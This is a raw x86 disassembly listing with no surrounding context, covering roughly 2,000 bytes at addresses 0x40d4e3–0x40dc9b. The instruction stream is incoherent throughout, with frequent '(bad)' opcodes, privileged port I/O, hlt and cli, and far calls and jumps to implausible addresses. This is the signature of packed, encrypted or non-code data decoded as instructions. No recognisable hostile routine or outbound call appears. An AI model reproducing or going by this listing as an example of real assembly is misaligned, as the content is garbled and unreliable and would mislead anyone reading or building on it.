  40d4e3:	add    BYTE PTR [ebp+0x5],cl
  40d4e6:	adc    DWORD PTR [ecx],edx
  40d4e8:	jns    0x40d53d
  40d4ea:	out    0x9e,eax
  40d4ec:	je     0x40d4c2
  40d4ee:	and    DWORD PTR [ebx-0xf0a7917],ecx
  40d4f4:	fdivrp st(0),st
  40d4f6:	test   al,0x3
  40d4f8:	bound  edx,QWORD PTR [eax]
  40d4fa:	in     eax,0x8a
  40d4fc:	xor    esi,0x7e7543f9
  40d502:	mov    cl,0x2e
  40d504:	shl    dh,0x5b
  40d507:	and    dh,0x86
  40d50a:	lds    ecx,FWORD PTR [edx-0x192f6556]
  40d510:	je     0x40d514
  40d512:	add    BYTE PTR [esi],dl
  40d514:	rol    DWORD PTR [edx],0x5e
  40d517:	mov    al,ds:0x958b2f3b
  40d51c:	repz cdq 
  40d51e:	imul   edi,DWORD PTR [di],0x712ad0be
  40d525:	add    edx,DWORD PTR [ebx+0x37]
  40d528:	inc    esi
  40d529:	jns    0x40d51a
  40d52b:	div    ah
  40d52d:	imul   edi,edi,0xd01a76e8
  40d533:	cli    
  40d534:	ss add bh,bh
  40d537:	aam    0x22
  40d539:	hlt    
  40d53a:	aas    
  40d53b:	jmp    0x654f1b35
  40d540:	push   ecx
  40d541:	test   esi,edi
  40d543:	jmp    0xcfb4653d
  40d548:	add    BYTE PTR [eax],al
  40d54a:	add    BYTE PTR [eax],al
  40d54c:	add    BYTE PTR [ecx+eax*4+0xa6ae93d],dl
  40d553:	push   esi
  40d554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d556:	jne    0x40d569
  40d558:	test   eax,0x64037776
  40d55d:	js     0x40d561
  40d55f:	add    cl,ch
  40d561:	call   0x84ff:0x3706
  40d567:	mov    dl,BYTE PTR [ecx]
  40d569:	cmc    
  40d56a:	test   BYTE PTR [ebx-0x7c],dh
  40d56d:	add    ebp,DWORD PTR [edx+ecx*4-0x167421c9]
  40d574:	(bad)  
  40d575:	cld    
  40d576:	sub    ecx,DWORD PTR [ebp-0x387ff984]
  40d57c:	out    dx,al
  40d57d:	call   FWORD PTR [ecx+ebp*8-0x1a]
  40d581:	in     al,dx
  40d582:	sub    ecx,DWORD PTR [edx-0x29ff0e3f]
  40d588:	(bad)  
  40d589:	cld    
  40d58a:	sbb    dl,0x55
  40d58d:	mov    ch,0x18
  40d58f:	inc    eax
  40d590:	add    cl,al
  40d592:	std    
  40d593:	xchg   edi,eax
  40d594:	pop    eax
  40d595:	inc    esp
  40d596:	dec    esi
  40d597:	mov    bl,0x1
  40d599:	sbb    al,0x7a
  40d59b:	jae    0x40d58d
  40d59d:	xchg   edi,eax
  40d59e:	ret    
  40d59f:	dec    esi
  40d5a0:	lea    ecx,[ecx+0x7a]
  40d5a3:	dec    esi
  40d5a4:	call   0x3e3cda
  40d5a9:	lahf   
  40d5aa:	ret    0x850a
  40d5ad:	int3   
  40d5ae:	mov    bl,BYTE PTR [ebp+0xc3]
  40d5b4:	add    BYTE PTR [eax],al
  40d5b6:	in     al,0xe4
  40d5b8:	jmp    0xd9c349bc
  40d5bd:	je     0x40d584
  40d5bf:	jns    0x40d634
  40d5c1:	cld    
  40d5c2:	hlt    
  40d5c3:	gs cli 
  40d5c5:	call   DWORD PTR [ebx+0x7b]
  40d5c8:	jae    0x40d5c6
  40d5ca:	and    al,0x45
  40d5cc:	sar    edi,cl
  40d5ce:	and    esp,DWORD PTR [edi+0x5]
  40d5d1:	push   0xffffffcc
  40d5d3:	push   0x7b33fcd5
  40d5d8:	pop    ebp
  40d5d9:	pop    esi
  40d5da:	xlat   BYTE PTR ds:[ebx]
  40d5db:	inc    edi
  40d5dc:	rcl    DWORD PTR [ebp+0x17],0x6a
  40d5e0:	sub    esp,0x5755cdc4
  40d5e6:	mov    edi,0x47186655
  40d5eb:	aas    
  40d5ec:	add    BYTE PTR [ebx+0x341c096c],cl
  40d5f2:	push   edi
  40d5f3:	aas    
  40d5f4:	add    BYTE PTR [ecx+0x43c9b891],cl
  40d5fa:	pop    esp
  40d5fb:	jnp    0x40d610
  40d5fd:	sbb    al,0x4f
  40d5ff:	inc    eax
  40d600:	add    BYTE PTR [ebx+0x30a18819],cl
  40d606:	daa    
  40d607:	aas    
  40d608:	add    BYTE PTR [ebx+0x8a18a99],cl
  40d60e:	jne    0x40d670
  40d610:	inc    ebx
  40d611:	add    dh,ch
  40d613:	fdivrp st(3),st
  40d615:	mov    ds:0x435069,al
  40d61a:	add    BYTE PTR [eax],al
  40d61c:	add    BYTE PTR [eax],al
  40d61e:	add    dh,bh
  40d620:	fsubp  st(7),st
  40d622:	mov    ds:0x4360b5,al
  40d627:	out    dx,al
  40d628:	fsubp  st(3),st
  40d62a:	imul   esp,DWORD PTR [edi+0x38],0x99b6caff
  40d631:	jne    0x40d6af
  40d633:	sbb    eax,0x65347ad2
  40d638:	pusha  
  40d639:	inc    ebx
  40d63a:	add    BYTE PTR ds:0x75004d47,cl
  40d640:	adc    al,al
  40d642:	dec    edi
  40d643:	inc    ebx
  40d644:	and    dh,cl
  40d646:	mov    edi,0xff03d987
  40d64b:	ret    
  40d64c:	scas   eax,DWORD PTR es:[edi]
  40d64d:	shl    DWORD PTR [edx+0x43d075],cl
  40d653:	clc    
  40d654:	scas   al,BYTE PTR es:[edi]
  40d655:	xchg   edx,eax
  40d656:	push   edi
  40d657:	int    0x92
  40d659:	dec    ebp
  40d65a:	add    BYTE PTR [ebp+0x10],dh
  40d65d:	ror    BYTE PTR [edi-0x4e],0x8e
  40d661:	repnz retf 0x9936
  40d665:	xchg   ebp,edx
  40d667:	jge    0x58eee9d0
  40d66d:	add    cl,BYTE PTR [ebp-0x17d516f0]
  40d673:	mov    esp,DWORD PTR ds:0xdcee0002
  40d679:	xor    bh,bh
  40d67b:	inc    eax
  40d67c:	test   eax,0x847542bb
  40d681:	scas   eax,DWORD PTR es:[edi]
  40d682:	imul   eax,DWORD PTR [eax],0x0
  40d688:	mov    al,ds:0xb6c98738
  40d68d:	cdq    
  40d68e:	jne    0x40d70c
  40d690:	dec    ebp
  40d691:	add    al,BYTE PTR [ecx-0x64]
  40d694:	push   edi
  40d695:	dec    esi
  40d696:	out    0x3,eax
  40d698:	(bad)  
  40d699:	mov    edx,0xf2898738
  40d69e:	mov    eax,ds:0x9e837543
  40d6a3:	arpl   WORD PTR [esi-0x49],bp
  40d6a6:	sub    DWORD PTR [esp+ebp*2],eax
  40d6a9:	in     eax,0xe8
  40d6ab:	mov    edx,0xeb3502b7
  40d6b0:	pop    ebp
  40d6b1:	in     eax,0xfc
  40d6b3:	mov    edx,0xf31502b7
  40d6b8:	dec    ebp
  40d6b9:	in     eax,0x94
  40d6bb:	mov    edx,0xfb1502b7
  40d6c0:	xor    ch,bh
  40d6c2:	jnp    0x40d67e
  40d6c4:	aaa    
  40d6c5:	add    ch,al
  40d6c7:	retf   0xcb7
  40d6ca:	out    dx,eax
  40d6cb:	jnp    0x40d64e
  40d6cd:	lea    esp,[edx-0x38dc8abd]
  40d6d3:	sub    bh,BYTE PTR [edi+edi*4+0x772003f4]
  40d6da:	inc    esp
  40d6db:	or     esi,0x15
  40d6de:	mov    bh,0x2e
  40d6e0:	dec    edi
  40d6e1:	ds call 0x1c87:0x3dace19b
  40d6e9:	shl    DWORD PTR [ebx+0x9],cl
  40d6ec:	add    BYTE PTR [eax],al
  40d6ee:	add    BYTE PTR [eax],al
  40d6f0:	add    cl,ch
  40d6f2:	sub    DWORD PTR [ecx+0x7c],eax
  40d6f5:	out    0x0,al
  40d6f7:	jmp    0x9bb63815
  40d6fc:	ret    
  40d6fd:	and    bl,BYTE PTR [edx+0x2754f93]
  40d703:	bound  edx,QWORD PTR [ecx]
  40d705:	gs ja  0x40d68b
  40d708:	test   DWORD PTR [ecx],0xdf3408c8
  40d70e:	add    al,0x0
  40d710:	lahf   
  40d711:	xchg   ebx,eax
  40d712:	push   0xfffffffa
  40d714:	mov    al,ds:0xa9850271
  40d719:	dec    ebx
  40d71a:	xchg   bl,bl
  40d71c:	jmp    0x40d794
  40d71e:	add    ch,BYTE PTR [edx-0x1f]
  40d721:	xchg   BYTE PTR [ebp-0x314236bc],cl
  40d727:	mov    bl,0xd1
  40d729:	push   ss
  40d72a:	push   0xc1f5befe
  40d72f:	push   cs
  40d730:	ins    BYTE PTR es:[edi],dx
  40d731:	loopne 0x40d736
  40d733:	add    cl,ch
  40d735:	popf   
  40d736:	(bad)  
  40d737:	jmp    0x40d772
  40d739:	outs   dx,DWORD PTR ds:[esi]
  40d73a:	add    edx,DWORD PTR [esi+0x36]
  40d73d:	jmp    0x77291f93
  40d742:	mov    eax,DWORD PTR [ebp+esi*4-0xb]
  40d746:	ror    DWORD PTR [esi],0x6d
  40d749:	dec    eax
  40d74a:	add    eax,DWORD PTR [eax]
  40d74c:	jmp    0xea2cd648
  40d751:	jmp    0x40d6d8
  40d753:	mov    ds:0xeb,eax
  40d758:	add    BYTE PTR [eax],al
  40d75a:	jbe    0x40d75e
  40d75c:	lea    ebp,[esi+ebp*8-0x6716962f]
  40d763:	(bad)  
  40d765:	xchg   DWORD PTR [ecx+0x35600003],eax
  40d76b:	dec    esi
  40d76c:	test   BYTE PTR [ecx],ch
  40d76e:	stos   DWORD PTR es:[edi],eax
  40d76f:	test   DWORD PTR [ebx-0x7cfd8915],ecx
  40d775:	mov    ah,0xfe
  40d777:	or     DWORD PTR ds:0x3f465,0xefc60de9
  40d781:	mov    ecx,0xb9bfc60d
  40d786:	push   eax
  40d787:	(bad)  
  40d789:	arpl   WORD PTR [ecx],di
  40d78b:	add    eax,DWORD PTR [eax]
  40d78d:	add    ch,ah
  40d78f:	ret    0x85d7
  40d792:	pushf  
  40d793:	js     0x40d717
  40d795:	push   0x8300054e
  40d79a:	leave  
  40d79b:	xchg   ebp,eax
  40d79c:	dec    BYTE PTR [esi]
  40d79e:	loopne 0x40d7c8
  40d7a0:	add    al,BYTE PTR [eax]
  40d7a2:	pop    esp
  40d7a3:	clc    
  40d7a4:	inc    ebx
  40d7a5:	in     al,0x7c
  40d7a7:	sbb    al,0x3
  40d7a9:	push   esi
  40d7aa:	sbb    DWORD PTR [esi+0x51d4966],0xffffff89
  40d7b1:	inc    ebp
  40d7b2:	in     al,0x0
  40d7b4:	mov    edi,0x240900f
  40d7b9:	add    BYTE PTR [edx+eax*4],cl
  40d7bc:	arpl   sp,si
  40d7be:	add    BYTE PTR [eax],al
  40d7c0:	add    BYTE PTR [eax],al
  40d7c2:	add    BYTE PTR [ebx+ebx*1],bl
  40d7c5:	sub    cl,BYTE PTR [ebp-0x17a90d97]
  40d7cb:	test   eax,0x99ffffd3
  40d7d0:	inc    ecx
  40d7d1:	clc    
  40d7d2:	push   eax
  40d7d3:	addr16 mov edi,0x116b564e
  40d7d9:	or     al,0xe8
  40d7db:	sub    bh,BYTE PTR [ecx+eax*1]
  40d7de:	add    BYTE PTR [ecx+0x46],dl
  40d7e1:	jb     0x40d826
  40d7e3:	pop    edi
  40d7e4:	or     eax,edi
  40d7e6:	add    bl,bl
  40d7e8:	add    BYTE PTR [eax],bl
  40d7ea:	add    cl,ah
  40d7ec:	add    al,0x83
  40d7ee:	jge    0x40d814
  40d7f0:	jl     0x40d7ff
  40d7f2:	xchg   DWORD PTR [ebx+0xc000002],ebp
  40d7f8:	cli    
  40d7f9:	inc    ebx
  40d7fa:	clc    
  40d7fb:	sbb    DWORD PTR [ecx],edx
  40d7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7fe:	call   0x3e7da0
  40d803:	or     DWORD PTR [ecx],ecx
  40d805:	hlt    
  40d806:	mov    eax,DWORD PTR [edx-0x62]
  40d809:	inc    eax
  40d80a:	adc    dh,BYTE PTR [ebp+0x6b]
  40d80d:	add    ch,BYTE PTR [eax-0xf829f89]
  40d813:	je     0x40d87e
  40d815:	add    cl,BYTE PTR [ebx+0x44cb05b0]
  40d81b:	imul   ebp,DWORD PTR [ecx-0x80],0x26974e4
  40d822:	sub    DWORD PTR [eax+0x9975d],edi
  40d828:	add    BYTE PTR [eax],al
  40d82a:	add    BYTE PTR [eax],al
  40d82c:	neg    dh
  40d82e:	lahf   
  40d82f:	push   DWORD PTR [ebx-0x12]
  40d832:	lods   al,BYTE PTR ds:[esi]
  40d833:	add    BYTE PTR [ebp+0x69],dh
  40d836:	ja     0x40d87c
  40d838:	jge    0x40d7ea
  40d83a:	inc    DWORD PTR [ecx]
  40d83c:	jne    0x40d8a7
  40d83e:	add    cl,BYTE PTR [ebx+0x7185db5]
  40d844:	xor    ah,BYTE PTR [edi]
  40d846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d847:	xor    BYTE PTR [ebp+0x69],dh
  40d84a:	add    bl,BYTE PTR [esi-0x10]
  40d84d:	test   eax,0x98a53404
  40d852:	in     eax,dx
  40d853:	jmp    FWORD PTR [edi]
  40d855:	sub    eax,0x2efc5904
  40d85a:	test   al,0x84
  40d85c:	mov    ch,0x75
  40d85e:	(bad)  [ecx-0x55]
  40d861:	out    0x5,al
  40d863:	test   al,0x3d
  40d865:	sbb    edx,0x776974b2
  40d86b:	dec    esp
  40d86c:	test   eax,0xba8af953
  40d871:	sar    esp,0xd3
  40d874:	mov    edx,0x28bf7dd0
  40d879:	jae    0x40d893
  40d87b:	or     BYTE PTR [edx+0x752fa2a6],dh
  40d881:	imul   eax,DWORD PTR [edx],0x92a6ee5e
  40d887:	mov    al,BYTE PTR [eax+0x2]
  40d88a:	adc    eax,0xe978c3f4
  40d88f:	mov    ebp,0x0
  40d894:	add    cl,dh
  40d896:	(bad)  
  40d897:	loopne 0x40d89b
  40d899:	lock inc edx
  40d89b:	xchg   esp,eax
  40d89c:	(bad)  
  40d89d:	pop    edx
  40d89e:	push   0x1a
  40d8a0:	test   BYTE PTR [ebx-0x77],ch
  40d8a3:	test   eax,0x7b41f9fb
  40d8a8:	sti    
  40d8a9:	out    dx,eax
  40d8aa:	(bad)  
  40d8ab:	hlt    
  40d8ac:	cdq    
  40d8ad:	(bad)  
  40d8ae:	add    ecx,ebp
  40d8b0:	add    edi,esi
  40d8b2:	jns    0x40d925
  40d8b4:	leave  
  40d8b5:	and    ch,BYTE PTR [edx-0x4d]
  40d8b8:	mov    dh,0x75
  40d8ba:	add    ah,BYTE PTR [edx-0x37]
  40d8bd:	and    cl,BYTE PTR [ebx+0x7fc50c31]
  40d8c3:	xor    ebx,DWORD PTR [edi+esi*2+0x50]
  40d8c7:	pop    ss
  40d8c8:	lea    esp,[edi+0x262dc10e]
  40d8ce:	jg     0x40d875
  40d8d0:	add    eax,0xd1720eb6
  40d8d5:	es or  bh,0x32
  40d8d9:	out    dx,al
  40d8da:	ret    0xf7dc
  40d8dd:	jl     0x40d86a
  40d8df:	sbb    DWORD PTR [ebx+esi*4],ecx
  40d8e2:	add    eax,0xc2e232d9
  40d8e7:	in     al,0x8e
  40d8e9:	xor    DWORD PTR [esi+0x18],ebp
  40d8ec:	aad    0xff
  40d8ee:	retf   0x6f4
  40d8f1:	or     bh,BYTE PTR ds:[eax+0x5553c26b]
  40d8f8:	add    DWORD PTR [eax],0x0
  40d8fb:	add    BYTE PTR [eax],al
  40d8fd:	add    BYTE PTR [ebp-0x3d],dh
  40d900:	fmul   QWORD PTR [esi-0x308df1c9]
  40d906:	jb     0x40d8f4
  40d908:	or     ecx,DWORD PTR [edx+0x76]
  40d90b:	or     al,BYTE PTR [eax]
  40d90d:	jmp    0x9210d717
  40d912:	push   ds
  40d913:	mov    BYTE PTR [ecx+0x448d76e8],dh
  40d919:	and    DWORD PTR [ecx-0x8463975],ebp
  40d91f:	cmc    
  40d920:	femms  
  40d922:	ins    BYTE PTR es:[edi],dx
  40d923:	or     ch,al
  40d925:	out    dx,eax
  40d926:	add    eax,DWORD PTR ds:[eax]
  40d929:	fs mov ecx,0x5c6214f1
  40d92f:	jbe    0x40d8b5
  40d931:	test   DWORD PTR [edx+0x10],0x65bc7250
  40d938:	addr16 mov edi,0x2a887cf7
  40d93e:	popa   
  40d93f:	mov    esi,DWORD PTR [edx-0xb]
  40d942:	add    eax,edi
  40d944:	retf   
  40d945:	jae    0x40d9bd
  40d947:	ds push eax
  40d949:	xor    al,0x85
  40d94b:	cmp    DWORD PTR [ecx+eax*8+0x72],0x3ba705f7
  40d953:	push   ss
  40d954:	add    DWORD PTR [edx-0x11b8c194],edx
  40d95a:	in     eax,dx
  40d95b:	int    0xfe
  40d95d:	xchg   esi,eax
  40d95e:	test   DWORD PTR [eax+0x817c],0x7b000000
  40d968:	or     eax,0x7cf62f85
  40d96d:	(bad)  
  40d96e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d96f:	mov    ebx,0x8a030015
  40d974:	(bad)  
  40d975:	jl     0x40d9bc
  40d977:	scas   al,BYTE PTR es:[edi]
  40d978:	gs and eax,0x8d02719b
  40d97e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d97f:	ds int 0x8a
  40d982:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40d984:	jl     0x40d9fa
  40d986:	stc    
  40d987:	div    esi
  40d989:	or     eax,DWORD PTR [eax]
  40d98b:	inc    esp
  40d98c:	stos   BYTE PTR es:[edi],al
  40d98d:	inc    ebp
  40d98e:	add    DWORD PTR [edx+ecx*4-0x73468b42],ecx
  40d995:	jae    0x40d98f
  40d997:	sbb    ebx,edi
  40d999:	jb     0x40d9a9
  40d99b:	int3   
  40d99c:	mov    esp,es
  40d99e:	call   0x3ebd3e
  40d9a3:	adc    eax,0xf891a44
  40d9a8:	and    DWORD PTR [ebx+0x46927845],ecx
  40d9ae:	dec    ebp
  40d9b0:	(bad)  
  40d9b1:	std    
  40d9b2:	call   DWORD PTR [ebx+0x1]
  40d9b5:	ja     0x40d9c0
  40d9b7:	xlat   BYTE PTR ds:[ebx]
  40d9b8:	push   edx
  40d9b9:	(bad)  
  40d9ba:	mov    DWORD PTR [edi+0x6443892a],eax
  40d9c0:	ins    BYTE PTR es:[edi],dx
  40d9c1:	sub    al,0x8d
  40d9c3:	mov    eax,ds:0xe5e856aa
  40d9c8:	mov    al,0xff
  40d9ca:	inc    DWORD PTR [eax]
  40d9cc:	add    BYTE PTR [eax],al
  40d9ce:	add    BYTE PTR [eax],al
  40d9d0:	mov    eax,ds:0xa750f645
  40d9d5:	retf   
  40d9d6:	dec    esi
  40d9d7:	call   FWORD PTR [ecx+0x16]
  40d9da:	push   DWORD PTR [ebp+0x30]
  40d9dd:	jmp    0x15e2138
  40d9e2:	mov    esi,eax
  40d9e4:	cdq    
  40d9e5:	clc    
  40d9e6:	jb     0x40da10
  40d9e8:	(bad)  
  40d9e9:	jge    0x40d9e1
  40d9eb:	add    BYTE PTR [edx+0x2c438d24],cl
  40d9f1:	push   ecx
  40d9f2:	mov    eax,DWORD PTR [ebx-0x50]
  40d9f5:	push   eax
  40d9f6:	std    
  40d9f7:	jne    0x40da5d
  40d9f9:	pop    esp
  40d9fb:	call   0x402675
  40da00:	pop    eax
  40da01:	(bad)  
  40da02:	jae    0x40da10
  40da04:	inc    edi
  40da05:	inc    ebp
  40da06:	not    BYTE PTR [esi+0x75]
  40da09:	ret    
  40da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0b:	fdiv   QWORD PTR [edx+0x61428acb]
  40da11:	rol    edx,cl
  40da13:	lds    esi,FWORD PTR [ebx+ebp*2-0x77]
  40da17:	inc    edx
  40da18:	xor    eax,0xfc07c6e0
  40da1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da1e:	push   es
  40da1f:	jmp    0xfec1ff06
  40da24:	div    BYTE PTR [edx]
  40da26:	sbb    DWORD PTR [esi+0x1b],0x750b4622
  40da2d:	mov    dh,0x8b
  40da2f:	jmp    0x40da27
  40da31:	adc    eax,0x5328
  40da36:	add    BYTE PTR [eax],al
  40da38:	add    dh,ch
  40da3a:	and    DWORD PTR [ebp+0x43688544],ecx
  40da40:	push   ebp
  40da41:	leave  
  40da42:	pusha  
  40da43:	push   0x58
  40da45:	and    al,0x65
  40da47:	jg     0x40d9d3
  40da49:	inc    ebp
  40da4a:	out    0x78,eax
  40da4c:	je     0x40dac0
  40da4e:	sbb    BYTE PTR [eax+ebp*8-0x1f],al
  40da52:	imul   eax,DWORD PTR [edx],0x2dcfc200
  40da58:	lea    esp,[eax-0x54182563]
  40da5e:	cli    
  40da5f:	add    DWORD PTR [eax],eax
  40da61:	add    BYTE PTR [edi],ah
  40da63:	or     BYTE PTR [edi-0x2],0xac
  40da67:	rcl    BYTE PTR [edx+0x2],cl
  40da6a:	pop    ss
  40da6b:	or     al,0xe8
  40da6d:	sub    ch,BYTE PTR [ebx+eax*1]
  40da70:	add    ah,bh
  40da72:	es jl  0x40d9f9
  40da75:	mov    ch,0x7d
  40da77:	in     eax,0x69
  40da79:	outs   dx,DWORD PTR ds:[esi]
  40da7a:	out    dx,al
  40da7b:	(bad)
  40da7e:	hlt    
  40da7f:	cmc    
  40da80:	psrld  mm2,QWORD PTR [esi-0x32]
  40da84:	adc    eax,0x84e90235
  40da89:	mov    dh,0xe
  40da8b:	ins    BYTE PTR es:[edi],dx
  40da8c:	(bad)  
  40da8d:	into   
  40da8e:	rcl    BYTE PTR [ebp+0x16],cl
  40da91:	mov    eax,ds:0xfe03a910
  40da96:	aad    0x40
  40da98:	sub    al,0x48
  40da9a:	or     bl,BYTE PTR [ebx+0x80]
  40daa0:	add    BYTE PTR [eax],al
  40daa2:	and    DWORD PTR [edx],ecx
  40daa4:	lahf   
  40daa5:	imul   ebx,DWORD PTR [esi],0x51
  40daa8:	sub    eax,0xb38d3a80
  40daad:	outs   dx,DWORD PTR ds:[esi]
  40daae:	and    eax,0x2435ec8d
  40dab3:	push   0xffffffb6
  40dab5:	push   edx
  40dab6:	jae    0x40db33
  40dab8:	pop    ebx
  40dab9:	aas    
  40daba:	ja     0x40da43
  40dabc:	stos   DWORD PTR es:[edi],eax
  40dabd:	jg     0x40da4e
  40dabf:	pop    eax
  40dac0:	rcr    DWORD PTR [ebx+0x77],1
  40dac3:	(bad)
  40dac6:	ret    0xe48d
  40dac9:	inc    ecx
  40daca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dacb:	push   0x2e
  40dacd:	push   ebp
  40dace:	inc    ebx
  40dacf:	jnp    0x40db3c
  40dad1:	leave  
  40dad2:	rol    BYTE PTR ds:[edx+0x3],cl
  40dad6:	jbe    0x40db4f
  40dad8:	xor    eax,0x2ee312d6
  40dadd:	add    eax,0xf9a88575
  40dae2:	ins    BYTE PTR es:[edi],dx
  40dae3:	aam    0xc0
  40dae5:	jne    0x40db29
  40dae7:	jnp    0x40da96
  40dae9:	xor    esi,DWORD PTR ds:0x897eff67
  40daef:	adc    bl,BYTE PTR [esi-0x7f2d9107]
  40daf5:	and    esp,eax
  40daf7:	jp     0x40da86
  40daf9:	mov    esi,DWORD PTR [ecx]
  40dafb:	push   ss
  40dafc:	jo     0x40db32
  40dafe:	out    dx,al
  40daff:	inc    edx
  40db00:	ror    eax,1
  40db02:	fdivp  st(6),st
  40db04:	jmp    FWORD PTR [ebx]
  40db06:	add    BYTE PTR [eax],al
  40db08:	add    BYTE PTR [eax],al
  40db0a:	add    BYTE PTR [ecx-0x25],ch
  40db0d:	pop    ebp
  40db0e:	adc    bh,BYTE PTR [eax]
  40db10:	inc    ecx
  40db11:	psubsw mm3,QWORD PTR [ebp+0x456aeb87]
  40db18:	test   DWORD PTR [edx-0x74850534],0xfecaf2a4
  40db22:	mov    esp,0xfd147b6e
  40db27:	das    
  40db28:	sar    bh,0x8f
  40db2b:	mov    cl,0x85
  40db2d:	mov    edi,0x38c270b4
  40db32:	lods   al,BYTE PTR ds:[esi]
  40db33:	repnz out dx,al
  40db35:	add    edx,ebx
  40db37:	ss dec edx
  40db39:	shr    ebp,0x76
  40db3c:	sar    esi,1
  40db3e:	xchg   ebp,eax
  40db3f:	xchg   edx,eax
  40db40:	or     bh,bh
  40db42:	fsub   QWORD PTR [esi-0x1016bdb3]
  40db48:	jno    0x40dba2
  40db4a:	ins    BYTE PTR es:[edi],dx
  40db4b:	shl    ch,cl
  40db4d:	sub    al,0x69
  40db4f:	mov    ah,0x6f
  40db51:	leave  
  40db52:	sub    bh,BYTE PTR [ecx+0x2]
  40db55:	je     0x40db5c
  40db57:	leave  
  40db58:	leave  
  40db59:	test   al,0xe9
  40db5b:	jbe    0x40dbdb
  40db5d:	mov    edi,0xbdd08e55
  40db62:	loope  0x40db13
  40db64:	(bad)  
  40db65:	call   DWORD PTR [esi]
  40db67:	call   0x557a:0x36da140e
  40db6e:	rol    DWORD PTR [eax],0x0
  40db71:	add    BYTE PTR [eax],al
  40db73:	add    BYTE PTR ds:0x28a6fe6f,dl
  40db79:	jns    0x40db8f
  40db7b:	add    DWORD PTR [esi-0x3e],esp
  40db7e:	push   DWORD PTR [esi]
  40db80:	inc    BYTE PTR [eax+0x5e]
  40db83:	stos   BYTE PTR es:[edi],al
  40db84:	(bad)  
  40db85:	iret   
  40db86:	mov    al,BYTE PTR [eax]
  40db88:	loopne 0x40dbab
  40db8a:	or     al,0x56
  40db8c:	pop    ebx
  40db8d:	sbb    cl,BYTE PTR [eax]
  40db8f:	retf   
  40db90:	lahf   
  40db91:	dec    BYTE PTR [edx-0x26749a28]
  40db97:	jne    0x40db2e
  40db99:	mov    esi,esp
  40db9b:	je     0x40dbfe
  40db9d:	ss add eax,0xfe4456f5
  40dba3:	jae    0x40db4e
  40dba5:	in     eax,dx
  40dba6:	push   es
  40dba7:	test   eax,0xc084058c
  40dbac:	loopne 0x40dbcf
  40dbae:	push   edi
  40dbaf:	mov    edi,0x41cca4
  40dbb4:	jecxz  0x40dbae
  40dbb6:	adc    edx,DWORD PTR [edi+edi*2]
  40dbb9:	inc    ebp
  40dbba:	(bad)  
  40dbbb:	out    0x69,eax
  40dbbd:	icebp  
  40dbbe:	std    
  40dbbf:	(bad)  
  40dbc0:	(bad)  
  40dbc2:	std    
  40dbc3:	je     0x40dc16
  40dbc5:	in     eax,dx
  40dbc6:	xor    esi,0xff55f87b
  40dbcc:	inc    ecx
  40dbcd:	sbb    eax,0x585c4013
  40dbd2:	pop    esp
  40dbd3:	mov    ebx,DWORD PTR [edi+0x57c15c]
  40dbd9:	add    BYTE PTR [eax],al
  40dbdb:	add    BYTE PTR [eax],al
  40dbdd:	(bad)  
  40dbde:	jbe    0x40dc52
  40dbe0:	sub    edx,esp
  40dbe2:	jbe    0x40dc56
  40dbe4:	cmp    BYTE PTR [edi-0x68f3dbfe],al
  40dbea:	inc    esi
  40dbeb:	outs   dx,BYTE PTR ds:[esi]
  40dbec:	punpckhwd mm0,QWORD PTR [edx]
  40dbef:	and    al,0xc
  40dbf1:	cmovge esi,DWORD PTR [esi+0x57]
  40dbf5:	ins    DWORD PTR es:[edi],dx
  40dbf6:	div    DWORD PTR [edx+0x24]
  40dbf9:	sub    al,0xed
  40dbfb:	es rcr bl,1
  40dbfe:	idiv   bh
  40dc00:	ja     0x40dc56
  40dc02:	mov    eax,DWORD PTR [esi+0x78]
  40dc05:	jne    0x40dc5b
  40dc07:	retf   0x6073
  40dc0a:	popa   
  40dc0b:	xor    BYTE PTR [edi+0x60],0x6b
  40dc0f:	test   BYTE PTR [ecx*2+0x75424763],0xf0
  40dc17:	push   ss
  40dc18:	sbb    BYTE PTR [esi+0x2b],ah
  40dc1b:	add    al,0xeb
  40dc1d:	jge    0x40dc0a
  40dc1f:	sti    
  40dc20:	jnp    0x40dc97
  40dc22:	mov    cl,0xf6
  40dc24:	adc    bh,dh
  40dc26:	sbb    ch,BYTE PTR [esi+eax*4-0x5f]
  40dc2a:	(bad)  
  40dc2b:	jl     0x40dbaf
  40dc2d:	popf   
  40dc2e:	mov    edi,0x558d18f7
  40dc33:	je     0x40dc33
  40dc35:	xchg   edx,eax
  40dc36:	ret    
  40dc37:	adc    DWORD PTR [ebp+0x357bbb05],ecx
  40dc3d:	(bad)  
  40dc3e:	aam    0x4c
  40dc40:	inc    BYTE PTR [eax]
  40dc42:	add    BYTE PTR [eax],al
  40dc44:	add    BYTE PTR [eax],al
  40dc46:	jp     0x40dbdc
  40dc48:	adc    dl,BYTE PTR [esi+0x5d]
  40dc4b:	stc    
  40dc4c:	push   ebx
  40dc4d:	(bad)  
  40dc4e:	push   0xffffff82
  40dc50:	sbb    cl,bl
  40dc52:	mov    dh,0x69
  40dc54:	jnp    0x40dc6a
  40dc56:	jge    0x40dcb4
  40dc58:	ret    0xb0ff
  40dc5b:	in     al,0x44
  40dc5d:	pop    esi
  40dc5e:	aaa    
  40dc5f:	bound  eax,QWORD PTR [edx]
  40dc61:	mov    esi,DWORD PTR [esi+eiz*8+0x42]
  40dc65:	jae    0x40dcc5
  40dc67:	xor    DWORD PTR [ecx-0x779aa6ad],ecx
  40dc6d:	adc    eax,DWORD PTR [ebp-0x56f38717]
  40dc73:	data16 cmp cl,0x6f
  40dc77:	cs or  edi,edi
  40dc7a:	jl     0x40dc60
  40dc7c:	push   edx
  40dc7d:	inc    edi
  40dc7e:	lock fwait
  40dc80:	cmc    
  40dc81:	in     eax,0x37
  40dc83:	add    ebp,ebp
  40dc85:	add    esp,DWORD PTR [eax-0x297f7375]
  40dc8b:	jp     0x40dcf4
  40dc8d:	outs   dx,DWORD PTR ds:[esi]
  40dc8e:	push   es
  40dc8f:	add    ebp,ecx
  40dc91:	add    eax,DWORD PTR [esi-0x30]
  40dc94:	jno    0x40dc8c
  40dc96:	jb     0x40dc23
  40dc98:	es or  al,0x2a
  40dc9b:	rcr    BYTE PTR [edi-0x39],cl
